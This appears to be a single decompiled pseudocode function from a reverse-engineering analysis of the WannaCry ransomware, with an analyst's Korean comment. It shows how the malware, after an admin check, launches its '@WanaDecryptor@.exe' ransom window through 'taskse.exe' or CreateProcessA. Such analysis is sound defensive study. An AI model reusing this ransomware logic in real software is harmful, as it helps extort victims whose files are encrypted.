// --- Metadata ---
// Function Name: LaunchWanaDecryptor_10004890
// Address: 0x10004890
// Exported At: 20250522_124006
// Signature: unknown_signature
// ---------------
int LaunchWanaDecryptor_10004890()
{
  int result; // eax
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+4h] [ebp-65Ch] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+14h] [ebp-64Ch] BYREF
  CHAR Buffer; // [esp+58h] [ebp-608h] BYREF
  char v4[516]; // [esp+59h] [ebp-607h] BYREF
  __int16 v5; // [esp+25Dh] [ebp-403h]
  char v6; // [esp+25Fh] [ebp-401h]
  CHAR CommandLine[1024]; // [esp+260h] [ebp-400h] BYREF

  if ( !IsCurrentProcessAdmin_10001360() && !dword_1000DD94 )
    goto LABEL_4;
  Buffer = byte_1000DD98;
  memset(v4, 0, sizeof(v4));
  v5 = 0;
  v6 = 0;
  GetFullPathNameA("@WanaDecryptor@.exe", 0x208u, &Buffer, 0);
  sprintf(CommandLine, "%s %s", "taskse.exe", &Buffer);
  RunProcessWithTimeout_10001080(CommandLine, 0, 0);// taskse 실행 
  result = dword_1000DD94;
  if ( !dword_1000DD94 )
  {
LABEL_4:
    StartupInfo.cb = 68;
    ProcessInformation.hProcess = 0;
    memset(&StartupInfo.lpReserved, 0, 0x40u);
    ProcessInformation.hThread = 0;
    ProcessInformation.dwProcessId = 0;
    ProcessInformation.dwThreadId = 0;
    StartupInfo.dwFlags = 1;
    StartupInfo.wShowWindow = 5;
    result = CreateProcessA(0, "@WanaDecryptor@.exe", 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
    if ( result )
    {
      CloseHandle(ProcessInformation.hProcess);
      result = CloseHandle(ProcessInformation.hThread);
    }
  }
  return result;
}
